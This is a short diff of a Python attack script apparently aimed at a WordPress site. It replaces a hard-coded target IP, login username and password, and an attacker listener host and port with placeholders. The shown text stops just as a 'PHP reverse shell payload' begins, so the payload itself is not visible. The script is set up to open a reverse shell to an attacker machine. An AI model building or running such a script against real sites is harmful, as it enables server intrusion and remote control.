@@ -8,11 +8,11 @@ import urllib.parse
 from bs4 import BeautifulSoup
 
 # Configuration
-TARGET_URL = "http://172.20.0.50"  # Base URL of the WordPress site
-USERNAME = "webmaster"
-PASSWORD = "P@ssw0rd"
-LHOST = "192.168.125.100"  # Your local IP
-LPORT = "4444"  # Port for the reverse shell
+TARGET_URL = "<>"  # Base URL of the WordPress site
+USERNAME = "<>r"
+PASSWORD = "<>"
+LHOST = "<>"  # Your local IP
+LPORT = "<>"  # Port for the reverse shell
 
 # PHP reverse shell payload
 PHP_PAYLOAD = f"""<?php
